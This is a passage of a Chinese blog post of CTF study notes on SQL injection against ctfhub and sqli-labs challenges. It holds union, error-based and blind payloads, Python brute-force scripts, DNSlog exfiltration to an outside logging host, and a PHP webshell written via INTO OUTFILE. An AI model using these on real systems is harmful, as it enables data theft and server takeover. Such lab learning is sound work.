      <link href="/2020/09/22/sqlinjection/"/>
      <url>/2020/09/22/sqlinjection/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>sql注入是一种在ctf中比较常见的题型，在曾经的大家并没有注重安全的年代很多网站都有sql注入的漏洞，当然随着技术的发展，存在sql注入的网站越来越少，但其依旧是web安全中一大威胁，且一些题目中会包含相关步骤，需要了解掌握，以下主要记录各种手动注入的步骤</p><p><strong><em>没有图片，还没解决图片上传的问题，就这样吧，下一篇再解决</em></strong> </p><p>对于sql注入来说，我们一般会按照以下步骤</p><ol><li>判断是否存在注入（是否严格校验）<ol><li>可控参数改变是否影响页面</li><li>输入的sql语句是否能引发报错—通过报错可以看到数据库的一些语句痕迹**(比如使用单引号，双引号，小括号等，以及其组合，是sql语句闭合，导致原来的闭合语句后半部分报错，需要经验的积累)**</li><li>能否消除报错（闭合）</li></ol></li><li>判断注入类型</li><li>判断语句是否能被恶意修改</li><li>是否能够成功执行</li><li>获取想要的数据<ol><li>数据库-》表-》字段-》值<ol><li>当我们使用mysql时可以注意到，不止一个库，而其中的<strong>infomation_schema</strong> 库储存着<strong>所有库中的表</strong>的有关信息</li><li>information_schema中有三个表储存着我们想要的信息<ol><li>schemata表，该表中的<strong>schema_name</strong>字段包含了所有<strong>数据库的name信息</strong>，其它字段不做考虑，分别是编码和sql_path等，通过<strong>schema_name</strong>列来进行数据库的查询</li><li>tables表，该表中的<strong>table_name</strong>字段包含了所有的库中所有的表的名称，且其中的table_schema列包含了所有的库的名称（有重复，因为和后面的table_name)相对应</li><li>columns表，该表中的<strong>column_name</strong>字段包含了所有库中所有表的所有<strong>字段名称</strong>，其中的table_schema列包含了所有的库的名称，table_name列包含了所有的库中所有的表的名称</li></ol></li><li>在通过这三个表依次进行查询后可以知道哪个库有哪些表有哪些字段，这时候就可以按照我们所需来进行查询<em>为什么不直接用columns表呢，既然其中的列已经涵盖了库，表，列的信息？因为字段冗余，不便于我们对信息的查看，当然也可以通过sql语句的构造来解决这个问题，直接查询columns表或许是一个优越的选择</em></li></ol></li><li>在能够获取数据后，通过构造sql语句来进行查询，比如flag或者admin的账号和密码等敏感信息，或者在之后植入后门等。</li></ol></li></ol><h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><p>对于整数型注入，我们以ctfhub上的第一题整数型注入来进行实验以及记录</p><p>首先记录整数型注入的简单原理</p><p>最基础，通过?id=1’来进行判断  当加了单引号’后出现报错，说明可能存在注入点，  原理：正常语句时这样的：select * from table where id=1   select * from table where id=1’无法识别引号，会引起报错，<del>这样就可以判断他是一个整数型注入的点</del>，其实这样字符型也会报错，但需要判断的话需要看报错出现的提示，需要加双引号或者其他的东西来继续看结果才能判断</p><p>下面来进行注入，查找flag</p><ol><li><p>首先按照提示，输入一个参数：1，可以看到查询结果ID为1和data，此时的url为：</p><p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=1</code></p></li><li><p>加单引号后查询失败，可以看到一个sql语句：<code>select * from news where id=1&#39;</code>,说明有注入点，我们再加入#注释符可以成功执行，<strong>说明是一个整数型注入</strong>现在开始注入</p></li><li><p>首先要判断此时的表中有多少列的数据，可以使用order by或者union select</p><ol><li>order by 1如果成功说明一列，order by 2成功为两列，以此类推，order by 是按照第几列来排序的，这里使用了他的特性如果该列不存在则报错的属性来判断有几列</li><li>union select是联合查询，是将查询组合到一起的操作，在判断时union select 1,2,4 这是试3列是否正确，这里的数字是几不重要</li></ol><p>实验后发现，当语句为<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=1 order by 2</code></p><p>时有输出，说明有该表有两列，此时就可以使用union seclect了</p></li><li><p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=1 union select 1,user()</code></p><p>此时我们想要的是简单查看一下user()但此时不会输出，因为显示的是id=1所查询到的，只要将id=1改为一个不可能查询到的数即可，比如-1，*若还不出则改变user()在union select中的位置，改变后查询成功</p></li><li><p>现在开始查询库，表，字段的信息：<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select 1,schema_name from information_schema.schemata</code></p><p>可以查到一个库名，要想查看所有库怎么办？</p><p>使用一个group_concat()这个函数的作用是将所有的子弹组合起来在一起输出，这里再记录一个concat_wx()函数，其作用是将不同子段组合在一起输出：concat_ws(‘:’,id,password)这里的意思是将id与password子段对应组合输出，二者中间以：分隔，再将这个函数放在group_concat()中，及可输出所有的对应id与password</p><p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</code></p><p>此时查询到Data: information_schema,performance_schema,mysql,sqli，说明有这几个库，接下来查表，我们来查sqli这个库中的表</p><p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select database(),group_concat(table_name) from information_schema.tables   where table_schema = &#39;sqli&#39;</code>(注意这里的table_schema=要加单引号，因为每加半天没出来)</p><p>查询可以看到该库的表，其中发现了名为flag的表</p><p>接下来就是查询字段了，我们来看flag这个表里有哪些字段<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select database(),group_concat(column_name) from information_schema.columns   where table_schema = &#39;sqli&#39; and table_name=&#39;flag&#39;</code></p><p>可以看到有一个字段：flag</p><p>此时我们已经完成了探索，只需要将需要的flag取出来即可：<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select database(),flag from sqli.flag</code></p><p>即从对应的库的对应表中取出数据：ctfhub{63dcb9358daa938b5fdb1c976c04ca8b8436d6c2}</p><p>拿到了flag</p></li></ol><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,flag from sqli.flag --+</code></p><p>这是最后的结果，作为参考</p><p>当我们输入1后可以看到（这是靶场特地放出来的，一般情况下不会放出需要自己去判断是什么样的注入），比如整数型加单引号报错后简单的#就可以消除报错，但字符型不行，需要在后面加–+来将原来的单引号注释掉才能成功执行，这说明这是一个字符型注入</p><p>select * from news where id=’1’，这就体现出是字符报错</p><ol><li><p>判断出是字符型后就加–+来消除报错，之前 的单引号已经使id=’1’闭合了，所以–+注释掉之前的单引号<code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39;  --+</code></p><p>此时可看到执行成功，有输出，现在开始判断有多少列</p></li><li><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39;  order by 2--+</code>可以看到有两列，</p></li><li><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; union select 1,database()--+</code>此时输出发现有结果但不是我们想要的，因为输出的是通过id查到的东西，将其变为不可查到的东西，使用 and 1=0这样让id查找的值始终为false，就可以查找我们想要的了</p><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,database()--+</code></p><p>可以看到当前的database为sqli</p></li><li><p>现在开始查询库，表，列</p><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,group_concat(schema_name) from information_schema.schemata --+</code> 可以看到查询到了几个库：Data: information_schema,performance_schema,mysql,sqli，下面来查sqli库中的表<code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39; --+</code></p><p>可以看到有flag表和news表，我们来查flag表有哪些字段</p><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;sqli&#39; and table_name =&#39;flag&#39; --+</code></p><p>发现有flag字段，查出来就可以了<code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,flag from sqli.flag--+</code></p><p>字符型注入完成</p></li></ol><h3 id="post型注入"><a href="#post型注入" class="headerlink" title="post型注入"></a>post型注入</h3><p>之前的都是get型注入，参数直接在url中就可以提现和更改，post型注入不同，其参数放在post表单里进行提交，一般来说登录框的提交就是post类型提交，原理还是一样的，检测是否能使其报错，报错后能否闭合，闭合后查去想要的数据，我们来具体过程如下，以sqli-labs中的第11题作为实验</p><p>这里的</p><ol><li><p>在post注入中，可以使用hackbar的post提交表单来进行或者通过burp来抓包改包，这里使用hackbar来作为实验，首先需要看一下页面组成元素可以看到以下两个</p><p>input type=”text” name=”uname” value=””</p><p>input type=”text” name=”passwd” value=””</p><p>可以看到两个框的输入，一个子段名为uname，一个为passwd，开始检查有无注入点：</p></li><li><p>使用hackbar的postdata，放入参数<code>uname=1&#39;&amp;passwd=1</code>，执行，可以看到报错，说明存在报错，简单说一下这里的语法，加入单引号，引起报错，因为使其不闭合</p></li><li><p>接下来要使其闭合，首先使用#<code>uname=1&#39; #&amp;passwd=1</code>,可以看到报错消失了，可以知道这是一个整型注入，我们知道要想登录成功需要为true所以我们使用<code>uname=1&#39; or 1 #&amp;passwd=1</code>，可以看到这时第一个uname处通过or已经成功为1了，此时已经可以登录成功了，接下来就开始查询想要的数据，去掉or 1 <code>uname=1&#39;  union select database(),1 #&amp;passwd=1</code>,就可以查到database()了,接下来就可以查询别的<code>uname=1&#39;  union select database(),group_concat(schema_name) from information_schema.schemata #&amp;passwd=1</code>,找到了有一个security库</p></li><li><p><code>uname=1&#39;  union select database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; #&amp;passwd=1</code></p><p>接下来就可以看到该表有哪些列了</p><p><code>uname=1&#39;  union select database(),group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#&amp;passwd=1</code></p><p>接着查到有username和password列，接下来直接查想要的就好了</p><p><code>uname=1&#39;  union select database(),group_concat(concat_ws(&#39;:&#39;,username,password)) from security.users #&amp;passwd=1</code></p></li></ol><h3 id="双注入"><a href="#双注入" class="headerlink" title="双注入"></a>双注入</h3><ul><li><p><strong>group by</strong> 语句时一个分组语句，将要选择的数据按照一个条件来进行分组，使其聚合在一起，</p></li><li><p>**concat()**函数用于将两个字符串连接为一个字符串,括号内CONCAT(‘FIRST ‘, ‘SECOND’)，这样输出时二者并在一起输出。</p></li></ul><p>双注入时我们在使用之前的手段即使用union select后无法在页面显示我们想要的信息时，通过在我们想要的地方报错使用子select，将敏感信息报错出来，就是双注入</p><p>双注入就是利用了group by和concat以及一个随机数<strong>floor(rand()*2)即0或1<strong>作为group by的条件，因为如果两次都取得了同一个值（如两次0）就会产生报错，这时候通过concat，将要查询的字段</strong>一个select语句，所以叫双注入**放在concat中，就在报错信息中被放出来了，这样就可以进行查询了，示例语句如下：<code>?id=1 union select 1,2 from infomation_schema group by concat(floor(rand() *2),(select table_name from infomation_shcema.tables))</code>**后续发现使用rand(0)*2更可控，</strong></p><p>这里以ctfhub中的技能树中的报错注入来做一个讲解</p><p><code>http://challenge-65678edc24f805b1.sandbox.ctfhub.com:10080/?id=1 union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),(select flag from flag))</code></p><p>这里的union select直接使用时无法获得数据的，需要后续的报错来进行报错。</p><p>但这里有一个问题，每一次的双注入报错，会不允许一次爆出多行数据，需要一行一行的找，需要在子select中使用 limit 0,1 limit 1,1一行一行的试，这里解出题是因为其库，表，字段的结构简单，但如果是一个未知的环境，会很难。</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>就是通过报错，将敏感信息爆出来，使用一些新的函数，可以使得报错注入更加简单，这里介绍三个函数来进行报错，</p><ol><li><strong>extractvalue()</strong>:从目标XML中返回包含所查询值的字符串，</li><li>extractvalue(XML_document,XPath_string);<ol><li>第一个参数，是string格式，为XML文档名称，</li><li>第二个参数，XPath_string（XPath格式的字符串）</li></ol></li><li>updatexml(XML_document,XPath_string,new_value)<ol><li>第一个参数，是string格式，为XML文档名称，</li><li>第二个参数，XPath_string（XPath格式的字符串）</li><li>第三个参数，new_value，string格式，替换查找到的符合条件的数据</li></ol></li><li>还有其他很多的报错注入函数：</li></ol><p><img src="/images/image-20210804160842031.png"></p><p>但在这里我们并不正确的使用这些函数，而是让他们报错，在报错的地方来看到敏感信息，</p><p>接下来来看这些语句的使用，还是以ctfhub的报错注入作为例子</p><ul><li>开始的判断报错不再展示，还是需要先判断有多少列，然后使用union select</li></ul><p><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,(select version()))</code>这里使用extractvalue（），第一个参数随便写个1，重点就是第二个参数，正常时应该使用一个字符串，这里用他来报错，这里就可以查出其version了，但注意到，这时查出的语句为：XPATH syntax error: ‘.22-MariaDB-0+deb10u1’，报错正常，但可以看到显示不全，这时候我们就需要加入一个concat函数来拼接一下，拼接0x74即一个’~’号，就可以查到了所有的信息了，</p><ul><li><p><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select version())))</code>这样就可以看到所有的信息了，现在就可以开始查想要的东西了，注意，<strong>可以group_concat()</strong><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))</code></p></li><li><p>这样可以看到本库里的表，看到有一个flag表，查这个表，<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39; limit 0,1)))</code>看到只有一个flag字段，那就只有这里了，查出来就行了，<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select flag from flag)))</code></p></li><li><p>但我们发现这时候的flag不全，只有一部分，这是因为用xpath报错值显示32位，这时候就需要使用一个函数，叫做<strong>mid()</strong>,</p></li></ul><pre class="line-numbers language-none"><code class="language-none">mid(str,start,[length])  str:截取的字符串  start:起始位置  length:截取的长度，可以忽略<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将子select当做str参数，start从32开始，就可以取到flag后半部分了<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,mid((select flag from flag),32)))</code></p><ul><li>我们也可以使用updatexml()函数，区别只是最后多一个参数，那个参数写1就行了</li></ul><p><strong>之前不知道怎么的，记录到时不能使用group_concat(),但其实是可以的</strong>，记录一下使用的详情，以sqlilab为例：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;))) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以得到：</p><p><img src="/images/image-20210722162921128.png"></p><p>报错注入差不多就这样了</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>什么是盲注，盲注就是在即使页面正常运行时也不会在页面上显示出数据，即使注入成功无法直接的查询到想要的数据，只能通过true or false来判断查询的单一字符是否正确。我们会通过该ascii码表来对需要的数据进行一一比对，在比对为真时就可以知道这一位的数据是我们想要的了。</p><p>我们在判断时会通过真假来，这时我们需要在确认了有注入点以及判断了是哪种类型的注入后，在为假的条件后（比如?id=1为真，?id=1’）使用 or 语句的后续语句真与否来判断。后续语句就是我们想要知道的信息了，写一条语句作为分析</p><ul><li>ascii()是将其中的字符转换为ascii对应的数字，如“A”会转换为65，这样方便比对，</li><li>substr(strings|express,m,[n])用于语句截断，<ul><li>第一个参数是要被截断的字符串，</li><li>第二个是开始截断的位数，</li><li>第三个是偏移量，即一次截断多少位</li></ul></li><li>除了substr()也有别的用于截断的函数，比如left(),right(),mid()+ord(),regexp(),也可能用到like()，可以灵活运用</li></ul><p><code>?id=1&#39; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = database() limit0,1)=100#</code></p><p>对语句做分析，在判断注入了以后使用#来消除报错，然后使用or语句，来进行布尔判断，括号内，可以看出我们现在在查的是当前数据库下的第一个表的名（通过limit)，而substr在判断这第一个表的名的第一个字母是否为ascii值为100的字符，如果是，则会显示true，这时我们就知道了第一个字符，然后依次试验下去，就知道了整个表名（是很繁琐以及不切实际，但原理确实是这样的，可以使用burp等自动化工具来爆破或者直接sqlmap，这里只是讲解原理）</p><p>下面通过ctfhub的布尔盲注来进行讲解</p><p><code>http://challenge-23383a60e8712835.sandbox.ctfhub.com:10080/?id=1 and (select ascii(substr(flag,1,1)) from flag)=99</code></p><p>我已经直接查flag了，因为的数据库结构和之前是一样的，因为过程一样所以之前的查库查表不在进行，我们输入了上述语句后可以看到网页给出提示<strong>query_success</strong>，说明我们flag表的flag字段的第一个字符时小写的C，因为ascii码为99。接下来怎么办，总不能自己一个一个实验吧，我们选择使用burp suit进行爆破，以两个字段，即substr里的第二个参数和最后的ascii值判断作为爆破的点，依次爆破就能得到flag了，（这是按照我学的视频里的方法，总感觉太慢了，所以我决定去看writeup，发现writeup是写了脚本，那我也写脚本吧，用个requests库就可以了，还不咋会，照着写了一个）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sysname<span class="token operator">=</span> <span class="token string">''</span>mark <span class="token operator">=</span> <span class="token string">'query_success'</span>urlOpen<span class="token operator">=</span><span class="token string">'http://challenge-62b5ddccaa603532.sandbox.ctfhub.com:10080/?id='</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment">#substr子段</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#ascii值子段</span>        url <span class="token operator">=</span> urlOpen<span class="token operator">+</span><span class="token string">'1 and (select ascii(substr(flag,%d,1)) from flag)=%d'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>  <span class="token comment">#依次判断</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> mark <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment">#可以知道比对成功就是query_sucess,所以以此作为判断</span>            name<span class="token operator">=</span>name<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后就可以输出了flag了，前面查询库，表也和这个类似，只是sql语句换一下罢了，这里就偷懒了</p><p>对于这种脚本最好用二分法进行优化一下，不然会很慢的，自己写一下挺简单的，会快不少。</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>也叫时间延时注入，这种注入在我们输入单引号，双引号，小括号时他都不会显示出报错（但其实是已经出错了），页面不会改变，这时候就需要通过if(),sleep()函数，使得我们的判断条件为真时会有页面延时的情况出现，即，构造好了语句，如果我们想要判断的条件为真，则页面执行会出现延迟，如果为假则不会有延迟。给出一个语句实例：<code>?id=-1 or if(select ascii(substr(table_name,1,1)) from informatio_schema.tables where tabel_schema=database() limit 0,1)=100,sleep(2),0) #</code></p><p>首先看一下if()和sleep()</p><ul><li>if(expr1,expr2,expr3)<ul><li>第一个参数是要判断真假的语句</li><li>如果为真，执行第二个参数</li><li>为假执行第三个参数</li></ul></li><li>sleep():等待多少秒执行啊</li></ul><p>我们所做的查询即第一个if参数，是需要判断真假的，其语法和布尔盲注一样，需要以此判断字符是多少，如果为真则会sleep两秒，可以看到执行时页面会有两秒的加载时间，如果为假，则不会有两秒的加载时间，以此判断即可</p><p><strong><em>这种手动做的话肯定不现实，需要借助工具或者写脚本，还是强调，这里只是原理</em></strong></p><p>还是以ctfhub的时间注入作为实例，还是写脚本解决，首先先测试一下：<code> http://challenge-5cb70d9ee61e79a0.sandbox.ctfhub.com:10080/?id=-1 or if((select ascii(substr(database(),1,1))=115),sleep(2),0) #</code></p><p>可以看到等于115时可以产生延时，那就按照这个语法写脚本就好了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">name<span class="token operator">=</span><span class="token string">''</span>urlOpen<span class="token operator">=</span><span class="token string">'http://challenge-5cb70d9ee61e79a0.sandbox.ctfhub.com:10080/?id=-1'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># url=urlOpen+' or if((select ascii(substr(database(),%d,1)))=%d,sleep(2),0) #'%(i,j) #库名</span>        <span class="token comment"># url = urlOpen +' or if((select ascii(substr(table_name,%d,1) from information_schema.tables where table_schema=\'sqli\')=%d),sleep(2),0) #'%(i,j)</span>        url <span class="token operator">=</span> urlOpen <span class="token operator">+</span><span class="token string">' or if((select ascii(substr(flag,%d,1)) from flag)=%d,sleep(1),0) #'</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        time1<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">100000</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        time2<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> time2<span class="token operator">-</span>time1<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">:</span>            name<span class="token operator">=</span>name<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑出来就好了，但发现跑的过程很艰辛，因为原理是时间延迟，所以如果网络不畅或者requests超时啥的会让人很头疼，可能出现一些错误的字符。。。跑了好多次。。。依旧失败了，每次都有flag结构但都会有些位出错，我选择sqlmap了。。。**<em>哈哈哈，最后一次脚本和sqlmap同时跑脚本先跑出来了，真的是网络原因，不稳定是真滴难受**</em></p><h3 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h3><p>在使用布尔，时间盲注的时候回造成很大的访问量，在一些时候回触发目标网站的安全机制，造成拦截，这时可以用到dnslog注入，可以一次性的得到数据库内容，再通过对其的自动化，可以大大提高注入效率。</p><p>dnslog注入的原理就是进行DNS解析时，dns服务器会记录访问信息，<strong>比如访问的域名</strong>，这些信息就可以用于DNS解析。通过Dnslog平台，可以看到这些信息，实现注入</p><p>这里记录一些dnslog平台：<br><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p><p><a href="https://dns.咕.com/">https://dns.xn--9tr.com/</a></p><p><a href="http://ceye.io/">http://ceye.io/</a></p><p>通过平台给的url，在linux上使用命令curl xxx.dfaf.ceye.io，接下来即可在平台上找到相关信息,</p><p>当我们输入命令</p><pre class="line-numbers language-none"><code class="language-none">curl &#96;whoami&#96;.dfaf.ceye.io# 在linux中&#96;&#96;中的内容会被直接作为命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再在平台中就可以看到会记录到<a href="http://ado.dfaf.ceye.io,这里的ado就是whoami的执行内容,这里就是实现dnslog注入的基础./">http://ado.dfaf.ceye.io，这里的ado就是whoami的执行内容，这里就是实现dnslog注入的基础。</a></p><p>而在MYSQL中，可以通过LOAD_FILE函数发起请求，实现dnslog注入，示例如下：</p><pre class="line-numbers language-none"><code class="language-none">select load_file(concat(&#39;\\\\&#39;,&#39;test&#39;,&#39;.ahh.dfaf.ceye.io\\abc123&#39;));# 请求后平台就会记录到信息：test.ahh.dfaf.ceye.ioselect load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.ahh.dfaf.ceye.io\\abc123&#39;));# 这样就可以查找出database了 ，注意，select语句这里数据格式和内容有限制，比如不能有@，~等特殊字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意，load_file发起请求只能在window上进行，linux不行，所以目标数据库必须在windows系统上，且需要足够的系统权限，即MYSQL的my.ini配置文件中secure_file_priv需要设置,因为其默认是NULL，即不允许读取文件，将其设置为””,即可实现dnslog注入</strong></p><p><img src="/images/image-20210719144639950.png"></p><p>可以看到此时为空，就可以实现dnslog注入了，这里以sqlilab的时间盲注做实验：</p><p><img src="/images/image-20210719151513063.png"></p><p>可以在dnslog平台看到：</p><p><img src="/images/image-20210719151550164.png"></p><p>说明查到表了，接下来就是在select语句做更改即可</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and load_file(concat(&#39;\\\\&#39;,(select schema_name from information_schema.schemata limit 2,1),&#39;.mysql.m1j8ro.ceye.io\\aaa&#39;))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20210719152145197.png"></p><p>接下来的步骤不做记录，注意，每次只能查一条，也不能group_concat(),要想更快不手动更改limit可以使用对应的脚本。</p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>就是注入点在cookie中，cookie是啥不再介绍，我们需要在cookie处进行注入，具体注入方法按照环境来决定，需要自己慢慢的尝试，也是一个经验的问题。需要多练习，以ctfhub上的cookie注入来作为例子。使用burpsuite来进行注入</p><p>打开题目告诉我们注入点变了，使用burp抓包</p><p>可以看到cookie：</p><pre class="line-numbers language-none"><code class="language-none">Cookie: id&#x3D;1; hint&#x3D;id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们在id这里进行注入，在repeter里进行 </p><p><code>Cookie: id=-1 union select 1,database();</code></p><p>可以看到已经显示出了database，继续注入就好了，不再演示，最后的语句是<code>Cookie: id=-1 union select 1,group_concat(nuwjexalch) from nuyuogkrho;</code></p><p>得到flag</p><h3 id="http-Referer注入"><a href="#http-Referer注入" class="headerlink" title="http-Referer注入"></a>http-Referer注入</h3><p>及注入点在referer中，可以注意到在讲解视屏中除了可以看到，讲解人通过其报错信息发现，<strong>并不是通过select的语句进行注入，而是update或者insert</strong>，所以需要复习一下sql语句啊。。。所以其实重要的还是找到注入点和使其报错以及<strong>通过构造语句使其不报错</strong>，下面以ctfhub上的referer注入为实例进行实验，打开页面可以看到提示我们“请在referer输入id”，使用burpsuite进行抓包，抓了后看了一下，没有referer字段，需要自己构造，注意构造的格式，最开始就是因为构造格式不对所以错了</p><p>最开始是这样构造的：</p><pre class="line-numbers language-none"><code class="language-none">Referer: id&#x3D;1#发现不对Referer: 1#这样才对接下来继续注入就对了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>Referer: -1 union select 1,group_concat(hnsyfohxaa) from verizqvbgj</code></p><p>这是最后的referer语句</p><h3 id="sql注入读写文件"><a href="#sql注入读写文件" class="headerlink" title="sql注入读写文件"></a>sql注入读写文件</h3><p>读取文件是通过一个Load_file(file_name)函数来进行的对服务器上的文件的读取,这个函数有四个使用条件</p><ul><li>必须有权限读取并且文件必须完全可读</li><li>欲读取文件必须在服务器上</li><li>必须指定完整的路径</li><li>欲读取文件大小必须小于max_allowed_packet</li></ul><p>还是先要判断注入点和注入类型，然后再在这里进行文件的读取，比如<code>?id=1&#39; union select 1,load_file(&quot;C:\\www\\sqli&quot;)</code>,然后在?id前的路径出写上想要访问的文件如:”index,php”</p><p>写入文件：</p><p>函数outfile(),和load_file很类似，比如</p><p><code>?id=1&#39; union select 1,2,&quot;&lt;?php @eval($_POST[aaa];?&gt;&quot; into outfile 